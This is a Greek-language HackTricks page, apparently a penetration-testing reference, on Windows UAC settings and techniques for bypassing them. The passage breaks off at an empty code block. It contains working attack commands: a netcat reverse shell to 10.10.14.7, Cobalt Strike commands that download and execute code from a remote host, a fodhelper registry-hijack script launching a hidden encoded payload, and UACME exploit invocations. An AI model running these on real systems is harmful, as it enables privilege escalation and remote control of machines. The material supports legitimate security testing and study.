# UAC - Έλεγχος λογαριασμού χρήστη

{{#include ../../banners/hacktricks-training.md}}

## UAC

Ο [Έλεγχος λογαριασμού χρήστη (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια λειτουργία που εμφανίζει **μήνυμα συγκατάθεσης για δραστηριότητες με αυξημένα δικαιώματα**. Οι εφαρμογές έχουν διαφορετικά επίπεδα `integrity`, και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελέσει εργασίες που **θα μπορούσαν δυνητικά να θέσουν σε κίνδυνο το σύστημα**. Όταν είναι ενεργοποιημένο το UAC, οι εφαρμογές και οι εργασίες **εκτελούνται πάντα στο περιβάλλον ασφαλείας ενός λογαριασμού που δεν είναι διαχειριστής**, εκτός αν ένας διαχειριστής εξουσιοδοτήσει ρητά αυτές τις εφαρμογές/εργασίες να έχουν πρόσβαση διαχειριστή στο σύστημα. Είναι μια λειτουργία ευκολίας που προστατεύει τους διαχειριστές από ακούσιες αλλαγές, αλλά δεν θεωρείται όριο ασφαλείας.<sup>[[2]](#references)</sup>

Για περισσότερες πληροφορίες σχετικά με τα επίπεδα integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν είναι ενεργό το UAC, ένας χρήστης-διαχειριστής λαμβάνει 2 tokens: ένα token τυπικού χρήστη, για την εκτέλεση συνηθισμένων ενεργειών με medium integrity, και ένα με δικαιώματα διαχειριστή.

Αυτή η [σελίδα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) περιγράφει λεπτομερώς πώς λειτουργεί το UAC και περιλαμβάνει τη διαδικασία σύνδεσης, την εμπειρία χρήστη και την αρχιτεκτονική του UAC.<sup>[[2]](#references)</sup> Οι διαχειριστές μπορούν να χρησιμοποιήσουν πολιτικές ασφαλείας για να διαμορφώσουν τη λειτουργία του UAC ανάλογα με τις ανάγκες του οργανισμού τους, τοπικά (με χρήση του secpol.msc) ή μέσω διαμόρφωσης και διάθεσης με Group Policy Objects (GPO) σε περιβάλλον τομέα Active Directory. Οι διάφορες ρυθμίσεις περιγράφονται λεπτομερώς [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 ρυθμίσεις Group Policy που μπορούν να οριστούν για το UAC. Ο παρακάτω πίνακας παρέχει περισσότερες λεπτομέρειες:

| Ρύθμιση Group Policy                                                                                                                                                                                                                                                                                                                                                           | Κλειδί μητρώου                | Προεπιλεγμένη ρύθμιση                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Έλεγχος λογαριασμού χρήστη: Λειτουργία έγκρισης διαχειριστή για τον ενσωματωμένο λογαριασμό διαχειριστή](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Απενεργοποιημένο)                                             |
| [Έλεγχος λογαριασμού χρήστη: Συμπεριφορά του μηνύματος ανύψωσης δικαιωμάτων για διαχειριστές στη Λειτουργία έγκρισης διαχειριστή](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Αίτημα συγκατάθεσης για αρχεία εκτός Windows στην ασφαλή επιφάνεια εργασίας) |
| [Έλεγχος λογαριασμού χρήστη: Συμπεριφορά του μηνύματος ανύψωσης δικαιωμάτων για τυπικούς χρήστες](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Αίτημα διαπιστευτηρίων στην ασφαλή επιφάνεια εργασίας)         |
| [Έλεγχος λογαριασμού χρήστη: Εντοπισμός εγκαταστάσεων εφαρμογών και αίτημα ανύψωσης δικαιωμάτων](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Ενεργοποιημένο· απενεργοποιημένο από προεπιλογή στην έκδοση Enterprise)           |
| [Έλεγχος λογαριασμού χρήστη: Ανύψωση δικαιωμάτων μόνο για εκτελέσιμα αρχεία που είναι υπογεγραμμένα και επικυρωμένα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Απενεργοποιημένο)                                             |
| [Έλεγχος λογαριασμού χρήστη: Ανύψωση δικαιωμάτων μόνο για εφαρμογές UIAccess που είναι εγκατεστημένες σε ασφαλείς θέσεις](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Ενεργοποιημένο)                                              |
| [Έλεγχος λογαριασμού χρήστη: Εκτέλεση όλων των διαχειριστών σε Λειτουργία έγκρισης διαχειριστή](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Ενεργοποιημένο)                                              |
| [Έλεγχος λογαριασμού χρήστη: Να επιτρέπεται στις εφαρμογές UIAccess να ζητούν ανύψωση δικαιωμάτων χωρίς να χρησιμοποιούν την ασφαλή επιφάνεια εργασίας](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Απενεργοποιημένο)                                             |
| [Έλεγχος λογαριασμού χρήστη: Μετάβαση στην ασφαλή επιφάνεια εργασίας κατά την εμφάνιση μηνύματος ανύψωσης δικαιωμάτων](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Ενεργοποιημένο)                                              |
| [Έλεγχος λογαριασμού χρήστη: Εικονικοποίηση αποτυχιών εγγραφής αρχείων και μητρώου σε θέσεις ανά χρήστη](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Ενεργοποιημένο)                                              |

### Πολιτικές για την εγκατάσταση λογισμικού στα Windows

Οι **τοπικές πολιτικές ασφαλείας** (το "secpol.msc" στα περισσότερα συστήματα) είναι ρυθμισμένες από προεπιλογή ώστε να **αποτρέπουν χρήστες που δεν είναι διαχειριστές από την εγκατάσταση λογισμικού**. Αυτό σημαίνει ότι, ακόμη κι αν ένας χρήστης που δεν είναι διαχειριστής μπορεί να κατεβάσει το πρόγραμμα εγκατάστασης του λογισμικού σας, δεν θα μπορεί να το εκτελέσει χωρίς λογαριασμό διαχειριστή.

### Κλειδιά μητρώου για να ζητά το UAC ανύψωση δικαιωμάτων

Ως τυπικός χρήστης χωρίς δικαιώματα διαχειριστή, μπορείτε να διασφαλίσετε ότι ο «τυπικός» λογαριασμός θα **κληθεί από το UAC να εισαγάγει διαπιστευτήρια** όταν επιχειρεί να εκτελέσει ορισμένες ενέργειες. Αυτό απαιτεί την τροποποίηση ορισμένων **κλειδιών μητρώου**, για την οποία χρειάζεστε δικαιώματα διαχειριστή, εκτός αν υπάρχει **UAC bypass** ή ο εισβολέας έχει ήδη συνδεθεί ως διαχειριστής.

Ακόμη κι αν ο χρήστης ανήκει στην ομάδα **Administrators**, αυτές οι αλλαγές αναγκάζουν τον χρήστη να **εισαγάγει ξανά τα διαπιστευτήρια του λογαριασμού του** για να εκτελέσει ενέργειες διαχείρισης.

**Στην πράξη, αυτό είναι χρήσιμο μόνο όταν έχετε ήδη elevated token, UAC bypass ή εσφαλμένη ρύθμιση που σας επιτρέπει να αλλάξετε αυτά τα κλειδιά· διαφορετικά, η εγγραφή στο μητρώο θα αποκλειστεί.**

Τα κλειδιά και οι καταχωρίσεις μητρώου που πρέπει να αλλάξετε είναι τα εξής (με τις προεπιλεγμένες τιμές τους σε παρένθεση):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Αυτό μπορεί επίσης να γίνει χειροκίνητα μέσω του εργαλείου Local Security Policy. Μόλις αλλάξουν οι ρυθμίσεις, οι λειτουργίες διαχείρισης ζητούν από τον χρήστη να εισαγάγει ξανά τα διαπιστευτήριά του.

### Σημείωση

**Ο Έλεγχος λογαριασμού χρήστη δεν αποτελεί όριο ασφαλείας.** Επομένως, οι τυπικοί χρήστες δεν μπορούν να παρακάμψουν τους περιορισμούς των λογαριασμών τους και να αποκτήσουν δικαιώματα διαχειριστή χωρίς ένα local privilege escalation exploit.

### Ζητήστε από έναν χρήστη «πλήρη πρόσβαση στον υπολογιστή»

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Προνομια UAC

- Το Internet Explorer Protected Mode χρησιμοποιεί ελέγχους ακεραιότητας για να εμποδίζει διεργασίες με υψηλό επίπεδο ακεραιότητας (όπως τα προγράμματα περιήγησης στο web) να έχουν πρόσβαση σε δεδομένα με χαμηλό επίπεδο ακεραιότητας (όπως ο φάκελος των προσωρινών αρχείων Internet). Αυτό επιτυγχάνεται εκτελώντας το πρόγραμμα περιήγησης με token χαμηλής ακεραιότητας. Όταν το πρόγραμμα περιήγησης επιχειρεί να αποκτήσει πρόσβαση σε δεδομένα που είναι αποθηκευμένα στη ζώνη χαμηλής ακεραιότητας, το λειτουργικό σύστημα ελέγχει το επίπεδο ακεραιότητας της διεργασίας και επιτρέπει ανάλογα την πρόσβαση. Αυτή η λειτουργία βοηθά στην αποτροπή επιθέσεων απομακρυσμένης εκτέλεσης κώδικα από το να αποκτήσουν πρόσβαση σε ευαίσθητα δεδομένα του συστήματος.
- Όταν ένας χρήστης συνδέεται στα Windows, το σύστημα δημιουργεί ένα access token που περιέχει μια λίστα με τα δικαιώματα του χρήστη. Τα δικαιώματα ορίζονται ως ο συνδυασμός των δικαιωμάτων και των δυνατοτήτων ενός χρήστη. Το token περιέχει επίσης μια λίστα με τα διαπιστευτήρια του χρήστη, τα οποία χρησιμοποιούνται για την πιστοποίηση του χρήστη στον υπολογιστή και σε πόρους του δικτύου.

### Autoadminlogon

Για να ρυθμίσετε τα Windows ώστε να συνδέουν αυτόματα έναν συγκεκριμένο χρήστη κατά την εκκίνηση, ορίστε το **`AutoAdminLogon` registry key**. Αυτό είναι χρήσιμο σε περιβάλλοντα kiosk ή για δοκιμές. Χρησιμοποιήστε το μόνο σε ασφαλή συστήματα, καθώς εκθέτει τον κωδικό πρόσβασης στο registry.

Ορίστε τα ακόλουθα κλειδιά χρησιμοποιώντας τον Registry Editor ή την εντολή `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Για να επαναφέρετε την κανονική συμπεριφορά σύνδεσης, ορίστε το `AutoAdminLogon` σε 0.

## UAC bypass

> [!TIP]
> Σημειώστε ότι αν έχετε γραφική πρόσβαση στο σύστημα του θύματος, το UAC bypass είναι απλό, καθώς μπορείτε απλώς να κάνετε κλικ στο "Yes" όταν εμφανιστεί η προτροπή UAC

Το UAC bypass απαιτείται στην εξής περίπτωση: **το UAC είναι ενεργοποιημένο, η διεργασία σας εκτελείται σε περιβάλλον μέσης ακεραιότητας και ο χρήστης σας ανήκει στην ομάδα administrators**.

Είναι σημαντικό να αναφερθεί ότι είναι **πολύ δυσκολότερο να παρακαμφθεί το UAC όταν βρίσκεται στο υψηλότερο επίπεδο ασφάλειας (Always) απ' ό,τι όταν βρίσκεται σε οποιοδήποτε από τα άλλα επίπεδα (Default).**

### Γρήγορη διαλογή από shell μέσης ακεραιότητας

Πριν δοκιμάσετε ένα bypass, επιβεβαιώστε ότι βρίσκεστε στο σωστό σενάριο και αντιστοιχίστε το build του host με γνωστές λειτουργικές μεθόδους:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Πρακτικές σημειώσεις:
- Αν το `EnableLUA=0`, δεν χρειάζεστε bypass: οποιοδήποτε admin token μπορεί να ζητήσει απευθείας high integrity.
- Το `ConsentPromptBehaviorAdmin=2` ή `5` είναι το συνηθισμένο σενάριο για auto-elevate / COM-based bypasses.
- Το `Always Notify` ανεβάζει τον πήχη, αλλά θα πρέπει και πάλι να δοκιμάζετε την ακριβή έκδοση αντί να θεωρείτε ότι η προσπάθεια θα αποτύχει: το UACME εξακολουθεί να καταγράφει ορισμένες μεθόδους συμβατές με `AlwaysNotify` σε σύγχρονες εκδόσεις των Windows.<sup>[[3]](#references)</sup>

### Το UAC απενεργοποιημένο

Αν το UAC είναι ήδη απενεργοποιημένο (`ConsentPromptBehaviorAdmin` είναι **`0`**), μπορείτε να **εκτελέσετε ένα reverse shell με δικαιώματα admin** (high integrity level) χρησιμοποιώντας κάτι σαν:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### Παράκαμψη UAC με token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Τοπικό RPC + επαναχρησιμοποιήσιμο αντικείμενο εντοπισμού σφαλμάτων

Η τοπική διεπαφή RPC του AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` μπορεί να δημιουργήσει μια διεργασία με ενεργοποιημένο το debugging. Οι διεργασίες που δημιουργούνται μέσω debugging στο ίδιο thread μοιράζονται το αντικείμενο εντοπισμού σφαλμάτων του thread· ένα συμβάν debugging κατά τη δημιουργία παρέχει ένα handle διεργασίας με πλήρη πρόσβαση, ακόμη κι όταν το αποτέλεσμα RPC παρέχει μόνο περιορισμένη πρόσβαση. Έτσι, η επαναχρησιμοποίηση αντικειμένου εντοπισμού σφαλμάτων γίνεται primitive UAC για ένα μέλος της ομάδας Administrators με μέση ακεραιότητα.<sup>[[11]](#references)[[12]](#references)</sup>

Μια πρακτική ακολουθία είναι:<sup>[[11]](#references)[[12]](#references)</sup>

1. Καλέστε τη μέθοδο τοπικού RPC (απευθείας ή μέσω `NdrAsyncClientCall`) για να δημιουργήσετε μια μη ανυψωμένη προσωρινή διεργασία με ενεργοποιημένο το debugging.
2. Ανακτήστε το `ProcessDebugObjectHandle` με `NtQueryInformationProcess`, αποσυνδέστε το με `NtRemoveProcessDebug`, διατηρήστε το αντικείμενο και τερματίστε την προσωρινή διεργασία.
3. Χρησιμοποιήστε την ίδια διεπαφή RPC για να δημιουργήσετε μια έμπιστη διεργασία με αυτόματη ανύψωση και, στη συνέχεια, συσχετίστε το αποθηκευμένο αντικείμενο με το thread που καλεί, μέσω του `DbgUiSetThreadDebugObject`.
4. Καλέστε το `WaitForDebugEvent` και πάρτε το handle διεργασίας από το `CREATE_PROCESS_DEBUG_EVENT`· δημιουργήστε αντίγραφο του handle με το `NtDuplicateObject` πριν συνεχίσετε.
5. Δώστε το αντιγραμμένο handle στο `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` και εκκινήστε το payload με μια εκτεταμένη δομή πληροφοριών εκκίνησης. Με αυτόν τον τρόπο επαναχρησιμοποιείται το πλαίσιο της ανυψωμένης διεργασίας και η θυγατρική διεργασία εμφανίζεται να έχει έμπιστη γονική διεργασία.

Αναζητήστε τη σύντομη ακολουθία ενεργειών και όχι μόνο το δυαδικό αρχείο με αυτόματη ανύψωση: δημιουργία διεργασίας μέσω τοπικού AppInfo RPC, ερωτήματα `ProcessDebugObjectHandle`, αποσύνδεση/επανασύνδεση debugger, άμεσο συμβάν debugging δημιουργίας, αντιγραφή handle και θυγατρική διεργασία της οποίας η καταγεγραμμένη γονική διεργασία δεν αντιστοιχεί στη διεργασία που κάλεσε τα API δημιουργίας.<sup>[[12]](#references)</sup>

### **Πολύ** βασικό UAC "bypass" (πλήρης πρόσβαση στο σύστημα αρχείων)

Αν έχετε shell με χρήστη που ανήκει στην ομάδα Administrators, μπορείτε να προσαρτήσετε το κοινόχρηστο στοιχείο **C$** μέσω SMB (σύστημα αρχείων) τοπικά ως νέο δίσκο και θα έχετε **πρόσβαση σε όλα τα στοιχεία του συστήματος αρχείων** (ακόμη και στον φάκελο home του Administrator).

> [!WARNING]
> **Φαίνεται πως αυτό το κόλπο δεν λειτουργεί πλέον**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC bypass με Cobalt Strike

Οι τεχνικές του Cobalt Strike θα λειτουργήσουν μόνο αν το UAC δεν έχει οριστεί στο μέγιστο επίπεδο ασφάλειας.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** και **Metasploit** διαθέτουν επίσης αρκετά modules για **bypass** του **UAC**.

### Διεπαφές COM με αυξημένα δικαιώματα (`ICMLuaUtil` / `CMSTPLUA`)

Τα auto-elevated αντικείμενα COM παραμένουν μια πρακτική επιφάνεια για UAC σε σύγχρονες εκδόσεις. Το `ICMLuaUtil` εξακολουθεί να καταγράφεται από το UACME ως λειτουργικό στις τρέχουσες εκδόσεις των Windows, ενώ τα επιθετικά εργαλεία συνεχίζουν να προσαρμόζουν το `CMSTPLUA`, συνδυάζοντας μια διεργασία στην interactive επιφάνεια εργασίας, εκτέλεση 64-bit και, μερικές φορές, PEB/process masquerading πριν από την κλήση του COM Elevation Moniker.<sup>[[3]](#references)</sup>

Πρακτικές συμβουλές:
- Προτιμήστε μια διεργασία **64-bit** στην **interactive session** του χρήστη (συνήθως το `explorer.exe` ή μια θυγατρική διεργασία του).
- Αν αποτύχει ένα raw shell, δοκιμάστε ξανά από ένα BOF / υλοποίηση UACME αντί για ένα αφελές wrapper του `CreateProcess`.
- Αναμένετε η θυγατρική διεργασία να εκτελεστεί ως **ξεχωριστή διεργασία με αυξημένα δικαιώματα**· πολλά BOF δεν αυξάνουν τα δικαιώματα του τρέχοντος beacon επιτόπου.

### KRBUACBypass

Τεκμηρίωση και εργαλείο στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits για bypass του UAC

Το [**UACME**](https://github.com/hfiref0x/UACME) είναι μια συλλογή τεχνικών για bypass του UAC. Κάντε compile με Visual Studio ή MSBuild· η διαδικασία δημιουργεί αρκετά εκτελέσιμα (για παράδειγμα, `Source\Akagi\output\x64\Debug\Akagi.exe`), επομένως επιλέξτε τη μέθοδο που είναι κατάλληλη για το target build.<sup>[[3]](#references)</sup>\
Προσοχή: ορισμένα bypass εκκινούν ορατά προγράμματα ή εμφανίζουν prompts που μπορεί να ειδοποιήσουν τον χρήστη.<sup>[[3]](#references)</sup>

Το UACME αναφέρει την **έκδοση build από την οποία άρχισε να λειτουργεί κάθε τεχνική**.<sup>[[3]](#references)</sup> Μπορείτε να αναζητήσετε μια τεχνική που επηρεάζει τις εκδόσεις σας:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Επίσης, χρησιμοποιώντας τη [σελίδα](https://en.wikipedia.org/wiki/Windows_10_version_history), μπορείτε να βρείτε την έκδοση Windows `1607` από τις εκδόσεις build.

Μια πρακτική ροή εργασίας είναι να **αξιολογήσετε πρώτα το build του host** και έπειτα να εκτελέσετε την αντίστοιχη μέθοδο:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- Το `WinPwnage` συγκρίνει γρήγορα το τοπικό build με τις γνωστές μεθόδους UAC, κάτι που είναι χρήσιμο για να απορρίπτονται γρήγορα τα PoC που δεν λειτουργούν πλέον.<sup>[[4]](#references)</sup>
- Το `UACME` παραμένει ο καλύτερος δημόσιος κατάλογος για να αντιστοιχίσετε ένα bypass σε συγκεκριμένο build. Η έκδοση 3.7.1 πρόσθεσε τις μεθόδους 83–85, ενώ η προηγούμενη έκδοση επανέλεγξε τις υπάρχουσες μεθόδους σε **Windows 11 25H2**· ελέγξτε ξανά τον πίνακα μεθόδων και τις σημειώσεις έκδοσης αντί να θεωρείτε ότι ένα παλιό PoC εξακολουθεί να εφαρμόζεται χωρίς αλλαγές.<sup>[[3]](#references)[[9]](#references)</sup>

### Αλυσίδες WNF/UIAccess συμβατές με Always Notify (UACME 3.7.1)

Το `Always Notify` δεν εξαλείφει κάθε UAC bypass. Το UACME 3.7.1 υλοποιεί τρεις νέες μεθόδους x64 που συνδυάζουν ελεγχόμενη από τον χρήστη κατάσταση περιβάλλοντος/πρωτοκόλλου με συμπεριφορά προγραμματισμένων εργασιών με αυξημένα δικαιώματα ή UIAccess και τις χαρακτηρίζει όλες ως `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** ανακατεύθυνση του `SystemRoot`, ώστε η εργασία `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`, η οποία ενεργοποιείται από WNF, να κάνει το `taskhostw.exe` με αυξημένα δικαιώματα να φορτώσει το `unifiedconsent.dll` μέσω side-load. Το UACME το καταγράφει από το Windows 10 build 19041.
- **84 — TabTip:** χρήση του ίδιου primitive μεταβλητής περιβάλλοντος στο UIAccess `TabTip.exe`, το οποίο φορτώνει τα `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ή `rsaenh.dll`, ανάλογα με το build, και στη συνέχεια μετάβαση από το προκύπτον πλαίσιο UIAccess υψηλής ακεραιότητας. Το UACME το καταγράφει από τα Windows 8.1 / Server 2016.
- **85 — Narrator:** παραβίαση του πρωτοκόλλου `feedback-hub` ανά χρήστη, χειρισμός του Narrator με `Alt+CapsLock+F` και, στη συνέχεια, εκκίνηση ενός εγγράψιμου αντιγράφου του `osk.exe` που φορτώνει το `OskSupport.dll` μέσω side-load. Απαιτεί διαδραστική επιφάνεια εργασίας και καταγράφεται από τα Windows 10 1809 / Server 2019.

Αφού δημιουργήσετε τις μονάδες payload και το Akagi όπως τεκμηριώνεται από το UACME, καλέστε τον αντίστοιχο αριθμό μεθόδου (η προαιρετική εντολή είναι από προεπιλογή `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Οι μέθοδοι 84 και 85 εξαρτώνται από την αλληλεπίδραση με UIAccess/desktop, επομένως μην περιμένετε να λειτουργήσουν χωρίς αλλαγές από το Session 0 ή από ένα μη διαδραστικό service shell. Και οι τρεις μέθοδοι τροποποιούν την κατάσταση περιβάλλοντος/πρωτοκόλλου και τοποθετούν DLL· εξετάστε την υλοποίηση και αφαιρέστε αυτά τα artifacts μετά τις δοκιμές.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Το αξιόπιστο δυαδικό αρχείο `fodhelper.exe` εκτελείται αυτόματα με αυξημένα δικαιώματα στις σύγχρονες εκδόσεις των Windows. Κατά την εκκίνησή του, ελέγχει την παρακάτω διαδρομή μητρώου ανά χρήστη, χωρίς να επικυρώνει το ρήμα `DelegateExecute`. Η τοποθέτηση μιας εντολής εκεί επιτρέπει σε μια διεργασία Medium Integrity (όταν ο χρήστης ανήκει στην ομάδα Administrators) να εκκινήσει μια διεργασία High Integrity χωρίς προτροπή UAC.

Διαδρομή μητρώου που ελέγχει το fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Βήματα PowerShell (ορίστε το payload σας και, στη συνέχεια, ενεργοποιήστε το)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Σημειώσεις:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος της ομάδας Administrators και το επίπεδο UAC είναι προεπιλεγμένο/ελαστικό (όχι Always Notify με πρόσθετους περιορισμούς).
- Χρησιμοποιήστε τη διαδρομή `sysnative` για να εκκινήσετε ένα 64-bit PowerShell από μια 32-bit διεργασία σε 64-bit Windows.
- Το payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd ή διαδρομή EXE). Αποφύγετε τα περιβάλλοντα εργασίας που εμφανίζουν προτροπές, για λόγους stealth.

#### Trigger με `ComputerDefaults.exe` για τον ίδιο χειριστή `ms-settings`

Το `ComputerDefaults.exe` επιλύει την ίδια συσχέτιση `ms-settings\Shell\Open\command` ανά χρήστη με το `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Αφού ορίσετε την προεπιλεγμένη εντολή και την κενή τιμή `DelegateExecute` παραπάνω, χρησιμοποιήστε το `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` ως εναλλακτικό trigger· μην επαναλάβετε τη ρύθμιση του μητρώου.<sup>[[13]](#references)[[14]](#references)</sup> Οι προϋποθέσεις για διαχειριστή με medium integrity και την πολιτική UAC που αναφέρονται παραπάνω στις σημειώσεις για το `fodhelper.exe` εξακολουθούν να ισχύουν.<sup>[[2]](#references)[[3]](#references)</sup> Το UACME καταγράφει αυτό το trigger από τα Windows 10 RS4 (build 17134), επομένως επαληθεύστε το στο build του στόχου.<sup>[[3]](#references)</sup>

#### Παραλλαγή hijack CurVer/επέκτασης (μόνο HKCU)

Πρόσφατα δείγματα που κάνουν κατάχρηση του `fodhelper.exe` αποφεύγουν το `DelegateExecute` και αντί γι' αυτό **ανακατευθύνουν το ProgID `ms-settings`** μέσω της τιμής `CurVer` ανά χρήστη. Το auto-elevated binary εξακολουθεί να επιλύει τον χειριστή κάτω από το `HKCU`, επομένως δεν απαιτείται admin token για τη δημιουργία των κλειδιών:<sup>[[5]](#references)</sup>

```powershell
